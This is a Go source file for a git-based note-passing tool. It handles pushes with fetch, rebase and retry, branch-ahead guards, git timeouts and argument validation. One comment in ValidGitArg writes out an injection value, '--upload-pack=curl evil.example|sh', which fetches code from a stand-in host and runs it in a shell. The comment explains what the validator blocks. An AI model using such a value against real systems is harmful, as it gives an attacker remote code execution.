package bus

import (
	"context"
	"errors"
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// The push protocol.
//
// The table this replaces lost notes for one reason: the transport was `git push` typed by
// hand, and a push refused because someone else pushed first was a person's problem. On the
// night the issue records, one line rebased by hand every time and another simply lost its
// push. So the retry is INSIDE the tool, and a rejected push never reaches a person.
//
// The loop is fetch, rebase, push, bounded by an attempt count the caller states. Nothing
// here force-pushes, nothing rewrites published history, and the rebase only ever replays
// this line's own unpublished commits on top of what arrived -- which is safe precisely
// because senders only ever add files to their own lane, so two senders' commits touch
// disjoint paths and cannot conflict. A rebase that DOES conflict is therefore something
// this tool has no business resolving: it aborts the rebase, leaves the commit sitting on
// the branch, and says so.
//
// A `git push` publishes the whole BRANCH, not the commit just made, so a checkout
// already carrying commits this tool did not make would publish those too -- somebody
// else's half-finished work, sent to the table under a note's name. EnsureLevelWith is
// the guard: before anything is staged, the branch must be level with the remote, and if
// it is not, the run refuses and names the count. That is why the loop above says
// "commits" rather than "commit": once the guard has passed there is exactly one, and the
// loop is written to be true either way.

// Identity is the git identity a commit is made under. It is passed with `git -c` on the
// commit invocation and is never written to any config file, because a tool that edited
// the caller's global git identity to send a note would be a worse bug than the one it
// fixes.
type Identity struct {
	Name  string
	Email string
}

// PushResult is what CommitAndPush did.
type PushResult struct {
	Commit   string
	Attempts int
	Pushed   bool
}

// gitError carries the command and git's own stderr, which is the part a person needs.
type gitError struct {
	args   []string
	err    error
	output string
}

func (g *gitError) Error() string {
	out := strings.TrimSpace(g.output)
	if out == "" {
		return fmt.Sprintf("git %s: %v", strings.Join(g.args, " "), g.err)
	}
	return fmt.Sprintf("git %s: %v: %s", strings.Join(g.args, " "), g.err, out)
}

// DefaultGitTimeout is how long ONE git subprocess may run before this tool stops waiting
// on it, kills it, and refuses naming the call.
//
// THE FAILURE IT CLOSES: a git that never returns. A fetch or a push to a remote that
// accepts the connection and then says nothing hangs forever, and every guard in this file
// -- the branch-ahead refusal, the retry budget, the lock -- is downstream of a subprocess
// that returns. A tool a person is waiting on that has stopped saying anything is
// indistinguishable from a tool that is working, which is the same shape as every other
// silence this file exists to end. Sixty seconds is a fetch of a table's whole history on
// a slow link and far more than any local call; --git-timeout moves it.
const DefaultGitTimeout = 60 * time.Second

// killGrace is how long a killed git has to close its pipes before this tool stops reading
// them. See the comment at cmd.WaitDelay below.
const killGrace = 2 * time.Second

// gitTimeoutNanos is the budget in force, as an atomic so that setting it from main and
// reading it from a push goroutine is not a race. Zero means unset and reads as the
// default, so nothing has to run before the first call.
var gitTimeoutNanos atomic.Int64

func gitTimeout() time.Duration {
	if n := gitTimeoutNanos.Load(); n > 0 {
		return time.Duration(n)
	}
	return DefaultGitTimeout
}

// SetGitTimeout sets the per-subprocess budget. It is called once, from the flags, before
// anything runs git.
func SetGitTimeout(d time.Duration) error {
	if d <= 0 {
		return fmt.Errorf("--git-timeout must be a positive number of seconds, got %s", d)
	}
	gitTimeoutNanos.Store(int64(d))
	return nil
}

// gitEnv is what every git this tool starts runs under.
//
// GIT_EDITOR and GIT_SEQUENCE_EDITOR are here for the same reason GIT_TERMINAL_PROMPT is:
// `git rebase --continue`, which the conflict settlement below reaches, opens the commit
// message in an editor, and an editor opened under a tool whose output is a grammar is a
// hang rather than a message. `true` accepts the message git already has.
var gitEnv = []string{
	"GIT_TERMINAL_PROMPT=0", "GIT_PAGER=cat", "GIT_OPTIONAL_LOCKS=0",
	"GIT_EDITOR=true", "GIT_SEQUENCE_EDITOR=true",
}

func git(dir string, args ...string) (string, error) {
	full := append([]string{"-C", dir}, args...)
	budget := gitTimeout()
	ctx, cancel := context.WithTimeout(context.Background(), budget)
	defer cancel()
	cmd := exec.CommandContext(ctx, "git", full...)
	// A push that needs a credential must FAIL rather than block a tool a person is
	// waiting on, and a pager must never open under a tool whose output is a grammar.
	cmd.Env = append(cmd.Environ(), gitEnv...)
	// WaitDelay is what makes the budget real. Killing the process on the deadline is not
	// enough on its own: CombinedOutput reads the pipe until it CLOSES, and git's own
	// children -- an ssh, a credential helper, a pager -- inherit that pipe and hold it
	// open after git is gone, so a killed call still blocked for as long as its child chose
	// to live. WaitDelay closes the pipes a bounded time after the kill and lets the call
	// return. The grace is for git's own last words, which are the reason the output is
	// captured at all.
	cmd.WaitDelay = killGrace
	out, err := cmd.CombinedOutput()
	if errors.Is(ctx.Err(), context.DeadlineExceeded) {
		return string(out), fmt.Errorf("git %s did not finish within %s and was killed; nothing was left half-done by this tool, and a longer budget is --git-timeout <seconds>", strings.Join(args, " "), budget)
	}
	if err != nil {
		return string(out), &gitError{args: full, err: err, output: string(out)}
	}
	return string(out), nil
}

// ValidGitArg holds the shape a --remote or --branch may have: letters, digits, "-", "_",
// "/" and ".", and never a leading "-".
//
// These two flags are pasted onto a `git fetch` and a `git push` command line. Without
// this, a --remote of "--upload-pack=curl evil.example|sh" is not a remote at all, it is
// an option to git, and the tool would run it. The charset is deliberately narrower than
// what git itself accepts for a refname -- a table's remote is "origin" and its branch is
// "main" -- because the cost of being narrow is a refusal a person reads and the cost of
// being wide is a shell.
//
// The leading-dash rule is the load-bearing half; the charset is the belt to its braces.
// Together they make `--end-of-options` unnecessary, which matters because that option
// reaches only git versions that have it, and a guard that silently does nothing on an
// older git is worse than no guard at all.
func ValidGitArg(what, s string) error {
	if s == "" {
		return fmt.Errorf("--%s: empty", what)
	}
	if strings.HasPrefix(s, "-") {
		return fmt.Errorf("--%s %q: begins with a dash, so git would read it as an option rather than a name", what, s)
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '-' || r == '_' || r == '/' || r == '.':
		default:
			return fmt.Errorf("--%s %q: a name is letters, digits, %q, %q, %q and %q", what, s, "-", "_", "/", ".")
		}
	}
	return nil
}

// EnsureLevelWith fetches the remote branch and refuses when this checkout is AHEAD of it.
//
// The failure it closes is silent and large: `git push` publishes a branch, so a send from
// a checkout holding three unrelated local commits would put all three on the table under
// the note's push. That is somebody else's unfinished work published by a tool they did
// not run, and no output line said so. The count is taken BEFORE anything is staged, so
// the refusal costs the caller nothing but the fetch.
//
// The fetch is also the run's first fetch, which is why it is here rather than in the
// retry loop: the push protocol's first attempt is then made against a remote this
// checkout has already seen.
// The trailer every commit this tool makes carries, and the whole of how a later run knows
// its own work.
//
// THE WEDGE IT CLOSES, from the scenario run that found it. Five lines sent three notes
// each at once with a budget of three attempts. Fifteen were sent and six landed; the three
// lines that lost the race were then WEDGED, because their failed push had left its commit
// on the branch and the next `send` refused with "branch is ahead of origin/main by 1
// commits the tool did not make". The tool HAD made it. The guard could not tell its own
// unpushed commit from somebody else's unfinished work, so it refused the one recovery it
// was built to perform, and a person had to push by hand -- which is the failure this whole
// tool exists to end, arriving from inside it.
//
// So every commit is stamped, and the guard reads the stamp. A commit in the ahead range
// carrying `Nova-Bus:` is one of ours, left behind by a push that could not land, and the
// next push CARRIES it: a push publishes the branch, and the branch is exactly the notes
// this tool has written and not yet landed. A commit WITHOUT the trailer is the thing the
// guard was always for -- somebody's half-finished work that a note's push would publish
// under a name they did not run -- and it is still a refusal.
//
// The trailer is a git trailer rather than a marker in the subject because `git log
// --format=%B` shows it, `git interpret-trailers` reads it, and a person reading the log
// sees a line that says what made the commit.
const (
	// TrailerKey is the trailer's key.
	TrailerKey = "Nova-Bus"
	// TrailerSend, TrailerReceipt and TrailerCursor are the three things this tool commits.
	// A send carries the note's id after the word, so the log says which note.
	TrailerSend    = "send"
	TrailerReceipt = "receipt"
	TrailerCursor  = "cursor"
	// TrailerCommit is what stageAndCommit stamps a message that arrived without one, so
	// that no commit this tool makes can be mistaken for a person's.
	TrailerCommit = "commit"
)

// WithTrailer puts the trailer on a commit message, as its own paragraph at the end.
func WithTrailer(message, what string) string {
	return strings.TrimRight(message, "\n") + "\n\n" + TrailerKey + ": " + what + "\n"
}

// HasTrailer reports whether a commit message carries the trailer. It scans every line
// rather than only the last paragraph, because a rebase, a cherry-pick or a person editing
// a message can add lines under it, and a commit this tool made does not stop being one.
func HasTrailer(message string) bool {
	for _, line := range strings.Split(strings.ReplaceAll(message, "\r\n", "\n"), "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), TrailerKey+":") {
			return true
		}
	}
	return false
}

// notOurs lists the commits in ref..HEAD that this tool did not make, shortest form first,
// at most a handful so that a refusal stays a line a person reads.
func notOurs(dir, ref string) ([]string, error) {
	// -z separates the entries, so a commit message holding a blank line -- which every
	// message with a trailer does -- cannot look like the end of one.
	out, err := git(dir, "log", "-z", "--format=%H%n%B", ref+"..HEAD")
	if err != nil {
		return nil, err
	}
	var foreign []string
	for _, rec := range strings.Split(out, "\x00") {
		if strings.TrimSpace(rec) == "" {
			continue
		}
		sha, body, _ := strings.Cut(strings.TrimLeft(rec, "\n"), "\n")
		sha = strings.TrimSpace(sha)
		if HasTrailer(body) {
			continue
		}
		if len(sha) > shortSHAHex {
			sha = sha[:shortSHAHex]
		}
		foreign = append(foreign, sha)
	}
	return foreign, nil
}

// shortSHAHex is how much of a commit a refusal names: enough to `git show`.
const shortSHAHex = 12

// pullRebaseAdvice is the recovery every refusal in this file that gives one gives.
//
// It was `push or drop them first`, and a bare `git push` is advice that DOES NOT WORK:
// the state the refusal is about is a branch that is ahead of a remote which has itself
// moved, so the push it recommends is rejected exactly as the tool's own was. A refusal
// whose recovery fails is worse than one that offers none, because the person now believes
// they have tried the fix.
const pullRebaseAdvice = "land them with `git pull --rebase && git push`, or drop them, and run this again"

func EnsureLevelWith(dir, remote, branch string) error {
	if err := ValidGitArg("remote", remote); err != nil {
		return err
	}
	if err := ValidGitArg("branch", branch); err != nil {
		return err
	}
	if _, err := git(dir, "fetch", remote, branch); err != nil {
		return fmt.Errorf("the fetch that would say whether this branch is level with %s/%s failed: %w", remote, branch, err)
	}
	// The remote-tracking ref is what a person reads in `git status`, so it is what the
	// refusal names. It exists whenever the remote was configured by `git clone`; when it
	// does not exist -- a remote added by hand with no fetch refspec -- FETCH_HEAD is the
	// same commit and this run just wrote it.
	ref := remote + "/" + branch
	if _, err := git(dir, "rev-parse", "--verify", "--quiet", ref+"^{commit}"); err != nil {
		ref = "FETCH_HEAD"
	}
	out, err := git(dir, "rev-list", "--count", ref+"..HEAD")
	if err != nil {
		return err
	}
	ahead, err := strconv.Atoi(strings.TrimSpace(out))
	if err != nil {
		return fmt.Errorf("git rev-list --count printed %q, which is not a count", strings.TrimSpace(out))
	}
	if ahead == 0 {
		return nil
	}
	// Which of them are OURS. A commit carrying the trailer is one this tool made and could
	// not land, and carrying it into this push is the recovery rather than the refusal; only
	// a commit without the trailer is the unfinished work the guard exists for.
	foreign, err := notOurs(dir, ref)
	if err != nil {
		return fmt.Errorf("the branch is ahead of %s/%s by %d commits and the log that would say which of them this tool made failed: %w", remote, branch, ahead, err)
	}
	if len(foreign) > 0 {
		return fmt.Errorf("branch is ahead of %s/%s by %d commits, %d of which the tool did not make (%s); %s",
			remote, branch, ahead, len(foreign), strings.Join(foreign, ", "), pullRebaseAdvice)
	}
	return nil
}

// IsRepoRoot reports whether dir is the ROOT of a git work tree, so a table root that is
// merely a directory of Markdown is refused with that as the reason rather than with
// git's -- and so is a table that is a SUBDIRECTORY of somebody else's repository.
//
// THE FAILURE THIS CLOSES, which was silent and is the worst shape a failure here can
// have. The first version asked git only `rev-parse --is-inside-work-tree`, which is true
// anywhere under a repository. Point --table at `docs/table` inside a larger repo and
// every verb ran: `git diff --name-only` reports paths relative to the REPOSITORY ROOT, so
// a new note came back as `docs/table/from-stella/x.md`, the `from-` prefix guard in
// ChangedSince dropped it, and `inbox --since` and `check --as` reported an EMPTY change
// set and exited 0 over unread notes. Nothing in the output said the table had not been
// looked at. That is precisely the lie this whole tool exists to stop, so a --table that
// is not the root of its own repository is a refusal that names the root it found.
//
// The test is `git -C <table> rev-parse --show-toplevel` compared with --table, with
// symlinks resolved on BOTH sides -- the repo's own idiom, from `nova-check nocode
// --staged` (SPEC.md), and it is the same test for the same reason: never a test for
// `.git` being a directory, which is false in a linked worktree and in a submodule, both
// of which are legitimate places to keep a table. On this platform /var is a symlink to
// /private/var, so a --table under TMPDIR would otherwise disagree with git about its own
// name.
func IsRepoRoot(dir string) error {
	out, err := git(dir, "rev-parse", "--show-toplevel")
	if err != nil {
		return fmt.Errorf("%s is not a git work tree: %w", dir, err)
	}
	top := strings.TrimSpace(out)
	if top == "" {
		// A bare repository answers --is-inside-work-tree with false and prints nothing
		// here; either way there is no work tree to hold a table.
		return fmt.Errorf("%s is not a git work tree", dir)
	}
	want, err := resolved(dir)
	if err != nil {
		return err
	}
	got, err := resolved(top)
	if err != nil {
		return err
	}
	if want != got {
		return fmt.Errorf("%s is inside the git repository rooted at %s and is not its root; git reports changed paths relative to that root, so a table one directory down would report an empty change set over unread notes -- give --table %s, or make the table a repository of its own", dir, got, got)
	}
	return nil
}

// resolved is an absolute path with every symlink taken out, which is what makes two
// spellings of one directory comparable.
func resolved(dir string) (string, error) {
	abs, err := filepath.Abs(dir)
	if err != nil {
		return "", fmt.Errorf("%s: %w", dir, err)
	}
	full, err := filepath.EvalSymlinks(abs)
	if err != nil {
		return "", fmt.Errorf("%s: %w", dir, err)
	}
	return full, nil
}

// CurrentBranch is the checked-out branch, or an error on a detached HEAD.
func CurrentBranch(dir string) (string, error) {
	out, err := git(dir, "symbolic-ref", "--quiet", "--short", "HEAD")
	if err != nil {
		return "", errors.New("the table's checkout is not on a branch (detached HEAD)")
	}
	return strings.TrimSpace(out), nil
}

// EnsureClean refuses to run the protocol over a checkout holding changes that are not the
// note being sent.
//
// This is not tidiness. The retry loop rebases, and a rebase over a dirty tree either
// refuses or sweeps somebody's unrelated work into a note's commit. Both are worse than
// stopping here and saying which files are in the way.
//
// THE RECORD FORMAT, because getting it wrong here reads as clean. `--porcelain -z` emits
// "XY <path>\0" per change -- EXCEPT for a rename or a copy, where the new path is in that
// record and the OLD path follows as a second, separate NUL-terminated record with no
// status bytes of its own. A reader that treats every record alike takes that bare old
// path, strips three characters off the front of it, and reports a change to a file that
// does not exist -- or, when the path is under four characters, drops the whole rename on
// the floor and calls a dirty checkout clean. So renames are consumed as the pair they
// are, and BOTH halves must be permitted for the pair to be allowed.
func EnsureClean(dir string, allow []string) error {
	// --untracked-files=all is load-bearing: without it git COLLAPSES an untracked
	// directory to one entry, so a new note in a lane that does not exist yet is reported
	// as "from-rowan/" and never matches the path this run is allowed to write.
	out, err := git(dir, "status", "--porcelain", "-z", "--untracked-files=all")
	if err != nil {
		return err
	}
	permitted := map[string]bool{}
	for _, a := range allow {
		permitted[a] = true
	}
	recs := strings.Split(out, "\x00")
	var dirty []string
	for i := 0; i < len(recs); i++ {
		rec := recs[i]
		if len(rec) < 4 {
			continue
		}
		status, path := rec[:2], rec[3:]
		if strings.ContainsAny(status, "RC") {
			// The next record is the path it came from, and is not a change of its own.
			from := ""
			if i+1 < len(recs) {
				from = recs[i+1]
				i++
			}
			if permitted[path] && permitted[from] {
				continue
			}
			if from != "" {
				dirty = append(dirty, from+" -> "+path)
				continue
			}
			dirty = append(dirty, path)
			continue
		}
		if permitted[path] {
			continue
		}
		dirty = append(dirty, path)
	}
	if len(dirty) > 0 {
		return fmt.Errorf("the table's checkout holds changes that are not this note: %s", strings.Join(dirty, ", "))
	}
	return nil
}

// CommitOnly stages and commits without pushing. The note is NOT on the table until it is
// pushed, and every caller of this says so in its output: pushed=false is a state, not a
// success.
func CommitOnly(dir string, id Identity, paths []string, message string) (PushResult, error) {
	var res PushResult
	sha, err := stageAndCommit(dir, id, paths, message)
	if err != nil {
		return res, err
	}
	res.Commit = sha
	return res, nil
}

// identityArgs is the sender's identity as `git -c` arguments.
//
// It is needed by every invocation that WRITES a commit object, and a rebase writes one:
// replaying a commit makes a new one, and git demands a committer for it. Without this on
// the rebase, the retry loop worked on a bench whose git could guess an identity from the
// system password file and failed on one whose could not -- a CI runner, a container --
// with `empty ident name not allowed`, reported as though the note itself had conflicted.
// The identity a note is committed under must come from the roster and from nowhere else,
// on every invocation that records one.
func identityArgs(id Identity) []string {
	return []string{"-c", "user.name=" + id.Name, "-c", "user.email=" + id.Email}
}

// stageAndCommit is the half send, receipt and CommitOnly share.
func stageAndCommit(dir string, id Identity, paths []string, message string) (string, error) {
	if len(paths) == 0 {
		return "", errors.New("nothing to commit")
	}
	if strings.TrimSpace(id.Name) == "" || strings.TrimSpace(id.Email) == "" {
		return "", errors.New("no git identity for this sender")
	}
	// EVERY commit this tool makes carries the trailer, and this is the one place that is
	// enforced rather than asked for. A caller that named its own -- send, receipt, the
	// cursor -- keeps it; a caller that did not gets the generic one, so there is no path
	// through this function that leaves a commit the branch-ahead guard would later mistake
	// for somebody else's work.
	if !HasTrailer(message) {
		message = WithTrailer(message, TrailerCommit)
	}
	add := append([]string{"add", "--"}, paths...)
	if _, err := git(dir, add...); err != nil {
		return "", err
	}
	commit := append(append(identityArgs(id), "commit", "-m", message, "--"), paths...)
	if _, err := git(dir, commit...); err != nil {
		return "", err
	}
	sha, err := git(dir, "rev-parse", "HEAD")
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(sha), nil
}

// The backoff between push attempts: 50ms per attempt so far, plus up to 200ms of jitter,
// capped at one second.
//
// The cap is what keeps the whole retry budget a person's wait rather than a schedule:
// eight attempts is at most eight seconds of waiting on top of eight fetches, and a table
// where that is not enough has a problem no sleep fixes. The jitter is the load-bearing
// half -- a fixed delay leaves two benches that collided still colliding, one delay later
// -- and it is drawn from math/rand rather than crypto/rand deliberately: this is a
// scheduling nudge and nothing about it is a secret.
const (
	backoffStep   = 50 * time.Millisecond
	backoffJitter = 200 * time.Millisecond
	backoffCap    = time.Second
)

func pushBackoff(attempt int) time.Duration {
	d := time.Duration(attempt)*backoffStep + time.Duration(rand.Int64N(int64(backoffJitter)))
	if d > backoffCap {
		return backoffCap
	}
	return d
}

// sleepBetweenAttempts is time.Sleep, named so a test can take the wall clock out of the
// retry loop and assert on the spacing instead of waiting for it. Nothing but a test ever
// replaces it, and a test that does must not run in parallel with another that pushes.
var sleepBetweenAttempts = time.Sleep

// CommitAndPush stages the given repo-relative paths, commits them under id, and pushes
// with fetch, rebase and bounded retry.
//
// The commit names its paths explicitly, so anything else that happens to be staged is not
// swept into a note's commit.
func CommitAndPush(dir string, id Identity, paths []string, message, remote, branch string, attempts int) (PushResult, error) {
	var res PushResult
	if attempts < 1 {
		return res, fmt.Errorf("attempts must be at least 1, got %d", attempts)
	}
	// Checked again here, and not only where the flags are read: these two strings become
	// git's argv, and this function is the last place that is true.
	if err := ValidGitArg("remote", remote); err != nil {
		return res, err
	}
	if err := ValidGitArg("branch", branch); err != nil {
		return res, err
	}
	sha, err := stageAndCommit(dir, id, paths, message)
	if err != nil {
		return res, err
	}
	res.Commit = sha

	for attempt := 1; attempt <= attempts; attempt++ {
		res.Attempts = attempt
		if _, err := git(dir, "push", remote, "HEAD:refs/heads/"+branch); err == nil {
			res.Pushed = true
			return res, nil
		}
		if attempt == attempts {
			break
		}
		// Wait, a little, and not for exactly as long as the other line waits. Every
		// retry here was started by somebody else's push landing first, so the two lines
		// are in step by construction: they fetch, rebase and push again together, and a
		// loop with no wait in it turns one lost race into a run of them at whatever rate
		// the machine can fetch. The wait grows with the attempt so a busy table backs
		// off, and the jitter is what actually breaks the step -- two benches that sleep
		// the same 50ms are still in step.
		sleepBetweenAttempts(pushBackoff(attempt))
		// The remote moved. Take what arrived and replay our own commit on top of it.
		if _, err := git(dir, "fetch", remote, branch); err != nil {
			return res, fmt.Errorf("the push was refused and the fetch that would explain it failed: %w", err)
		}
		if _, err := git(dir, append(identityArgs(id), "rebase", "FETCH_HEAD")...); err != nil {
			// A conflict here is two sessions of ONE line, from benches that cannot see
			// each other, and the FILES it lands on are this tool's own: that lane's
			// RECEIPTS or INDEX, which are append-only and whose union is both sides'
			// lines; that reader's CURSOR and OPEN, where one of the two reads is further
			// along than the other. NO CONFLICT MAY WEDGE A LINE, so the tool settles
			// those itself -- see conflict.go -- and only a conflict on a NOTE, which is
			// two benches that sent the same note in the same second and were assigned one
			// id, is a person's decision. That one is aborted and reported.
			if settleErr := settleRebase(dir, id); settleErr != nil {
				if abortErr := abortRebase(dir); abortErr != nil {
					return res, abortErr
				}
				return res, &ConflictError{
					Reason: fmt.Sprintf("the rebase over what arrived conflicted on %s, which this tool will not settle for you; your commit %s is on the branch and was NOT pushed; recover with `git pull --rebase`, fix the files it names, `git rebase --continue`, then `git push`",
						oneLineOf(settleErr.Error()), res.Commit),
					Output: transcriptOf(err),
				}
			}
		}
		sha, err := git(dir, "rev-parse", "HEAD")
		if err != nil {
			return res, err
		}
		res.Commit = strings.TrimSpace(sha)
	}
	return res, fmt.Errorf("the push was refused %d times; your commit %s is on the branch and was NOT pushed; the next run of this tool will carry it, or land it now with `git pull --rebase && git push`", res.Attempts, res.Commit)
}

// --------------------------------------------------------------- reading only what moved

// ValidCommitHex holds the shape a CURSOR's commit may have: 7 to 64 lower-case hex
// digits, and nothing else.
//
// It is the same guard as ValidGitArg and it exists for the same reason. A CURSOR file is
// an ordinary file on a shared table; anyone who can push can write one, and its contents
// become a git argument. Requiring plain hex means a cursor cannot be an option to git, a
// revision expression, or a refname that resolves somewhere surprising -- it is a commit
// or it is a refusal. The range starts at 7 because a person editing the file by hand
// writes an abbreviation, and ends at 64 because that is a sha256 object name.
func ValidCommitHex(s string) error {
	if s == "" {
		return errors.New("empty commit")
	}
	if len(s) < 7 || len(s) > 64 {
		return fmt.Errorf("%q is not a commit: 7 to 64 lower-case hex digits", truncate(s, 64))
	}
	for _, r := range s {
		if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') {
			continue
		}
		return fmt.Errorf("%q is not a commit: 7 to 64 lower-case hex digits", truncate(s, 64))
	}
	return nil
}

// ValidRevision holds the shape a --since may have: a conservative revision charset with
// no leading dash, so a value this tool pastes onto a git command line is a revision and
// never an option. It is wider than ValidCommitHex because a person types `main~3` and
// narrower than what git accepts, on the same rule as --remote and --branch: the cost of
// being narrow is a refusal somebody reads.
func ValidRevision(s string) error {
	if s == "" {
		return errors.New("--since: empty")
	}
	if strings.HasPrefix(s, "-") {
		return fmt.Errorf("--since %q: begins with a dash, so git would read it as an option rather than a revision", truncate(s, 64))
	}
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
		case r == '-' || r == '_' || r == '/' || r == '.' || r == '~' || r == '^' || r == '@' || r == '{' || r == '}':
		default:
			return fmt.Errorf("--since %q: a revision is letters, digits and - _ / . ~ ^ @ { }", truncate(s, 64))
		}
	}
	return nil
}

// ResolveCommit turns a revision into the full commit it names, so that everything
// downstream of a --since is a sha and the sha is what the output reports.
func ResolveCommit(dir, rev string) (string, error) {
	if err := ValidRevision(rev); err != nil {
		return "", err
	}
	out, err := git(dir, "rev-parse", "--verify", "--quiet", rev+"^{commit}")
	if err != nil {
		return "", fmt.Errorf("%q names no commit in this checkout", truncate(rev, 64))
	}
	sha := strings.TrimSpace(out)
	if err := ValidCommitHex(sha); err != nil {
		return "", err
	}
	return sha, nil
}

// HeadCommit is the commit a cursor advances TO.
func HeadCommit(dir string) (string, error) {
	out, err := git(dir, "rev-parse", "--verify", "--quiet", "HEAD^{commit}")
	if err != nil {
		return "", fmt.Errorf("this checkout has no commits yet, so there is nothing to read up to: %w", err)
	}
	sha := strings.TrimSpace(out)
	if err := ValidCommitHex(sha); err != nil {
		return "", err
	}
	return sha, nil
}

// IsAncestor reports whether commit is reachable from HEAD.
//
// This is the guard on a cursor, and the failure it closes is a quiet one. A cursor is a
// promise that everything up to it has been read; that promise is only meaningful while
// the commit is still on the branch. After a history rewrite -- a rebase of the table, a
// force-push, a squash -- the commit named is either gone or on a line nobody is on, and a
// diff taken from it reports changes that are not changes and misses notes that are. So a
// cursor that is not an ancestor of HEAD is a REFUSAL with --full named in it, never a
// best effort: a reader told "nothing new" by a broken cursor has been lied to in exactly
// the way this whole tool exists to stop.
func IsAncestor(dir, commit string) (bool, error) {
	if err := ValidCommitHex(commit); err != nil {
		return false, err
	}
	return isAncestorOf(dir, commit, "HEAD")
}

// isAncestorOf is `git merge-base --is-ancestor`, with exit 1 read as the answer NO rather
// than as a failure. It takes both ends because the conflict settlement asks it about two
// cursors, neither of which is HEAD.
func isAncestorOf(dir, ancestor, descendant string) (bool, error) {
	for _, rev := range []string{ancestor, descendant} {
		if rev == "HEAD" {
			continue
		}
		if _, err := git(dir, "rev-parse", "--verify", "--quiet", rev+"^{commit}"); err != nil {
			return false, nil
		}
	}
	budget := gitTimeout()
	ctx, cancel := context.WithTimeout(context.Background(), budget)
	defer cancel()
	cmd := exec.CommandContext(ctx, "git", "-C", dir, "merge-base", "--is-ancestor", ancestor, descendant)
	cmd.Env = append(cmd.Environ(), gitEnv...)
	err := cmd.Run()
	if errors.Is(ctx.Err(), context.DeadlineExceeded) {
		return false, fmt.Errorf("git merge-base --is-ancestor did not finish within %s and was killed; a longer budget is --git-timeout <seconds>", budget)
	}
	if err != nil {
		var exit *exec.ExitError
		if errors.As(err, &exit) && exit.ExitCode() == 1 {
			return false, nil
		}
		return false, fmt.Errorf("git merge-base --is-ancestor: %w", err)
	}
	return true, nil
}

// LanePathspec is the pathspec that means "every file inside a lane".
//
// The `:(glob)` magic is load-bearing and was found the hard way. Without it, git matches a
// pathspec with fnmatch and `*` matches `/` as well, so a plain `from-*` also catches a
// top-level `from-notes.txt` -- and `from-*/`, the shape that reads like a directory,
// matches NOTHING AT ALL, because a wildcard pathspec must match the whole path and no path
// ends in a slash. That last one is the dangerous spelling: it is the obvious thing to
// write, it fails silently, and what it reports is an empty change set, which every reader
// downstream would have shown as "nothing new". Under `:(glob)`, `*` stops at a slash and
// `**` crosses one, so this is exactly "one directory whose name begins with from-, then
// anything under it".
const LanePathspec = ":(glob)from-*/**"

// ChangedSince is the whole of the O(new) claim, and it is one git command:
//
//	git diff --name-only -z --diff-filter=AM --no-renames <commit>..HEAD -- ':(glob)from-*/**'
//
// It returns the lane files ADDED or MODIFIED since the cursor, and its cost is
// proportional to the CHANGE rather than to the history: git walks the two trees and stops
// at every subtree whose object id is equal on both sides, so a table of ten thousand notes
// with one new one names one path. Every part of the command line is load-bearing:
//
//   - --diff-filter=AM, because a deleted note is not a new note;
//   - --no-renames, because git's rename detection is on by default and would report a
//     renamed note as R, which AM excludes -- so a note that moved would go unread. With
//     renames off it is a D and an A, and the A is the one that matters;
//   - -z, because --name-only QUOTES a path holding a space or a non-ASCII byte, and a
//     quoted path does not match a file on disk;
//   - the pathspec, because the table's own machinery -- a README, a CI file, the roster --
//     is not a note, and reading one as a note would be a parse failure reported to every
//     reader on the table.
func ChangedSince(dir, commit string) ([]string, error) {
	if err := ValidCommitHex(commit); err != nil {
		return nil, err
	}
	out, err := git(dir, "diff", "--name-only", "-z", "--diff-filter=AM", "--no-renames", commit+"..HEAD", "--", LanePathspec)
	if err != nil {
		return nil, err
	}
	var paths []string
	for _, p := range strings.Split(out, "\x00") {
		// The same claim the pathspec makes, made again here in Go. It is not redundant:
		// pathspec magic is a git feature, this is the tool's own rule, and a path that is
		// not inside a lane is not this tool's business whatever git matched.
		if p == "" || !strings.HasPrefix(p, "from-") || !strings.Contains(p, "/") {
			continue
		}
		paths = append(paths, p)
	}
	sort.Strings(paths)
	return paths, nil
}

// StagePaths trims a list of repo-relative paths to the ones `git add` can be asked for.
//
// `git add -- <path>` FAILS, exit 128, when the pathspec matches nothing on disk and
// nothing in the index. That is the right behaviour for a note -- a send that wrote no file
// should not commit -- and it is exactly wrong for a lane's OPEN list, which is legitimately
// absent whenever a reader has nothing open. A reader's very first advance with an empty
// inbox hit that: the run listed the inbox correctly and then died on `pathspec
// 'from-rowan/OPEN' did not match any files`.
//
// So a path is staged when it exists on disk (a write) or when git already tracks it (a
// deletion this run made, which must be staged or the file comes back), and is dropped when
// it is neither, because there is nothing there to record.
func StagePaths(dir string, paths []string) ([]string, error) {
	var out []string
	for _, p := range paths {
		if _, err := os.Stat(filepath.Join(dir, filepath.FromSlash(p))); err == nil {
			out = append(out, p)
			continue
		}
		tracked, err := git(dir, "ls-files", "--", p)
		if err != nil {
			return nil, err
		}
		if strings.TrimSpace(tracked) != "" {
			out = append(out, p)
		}
	}
	return out, nil
}
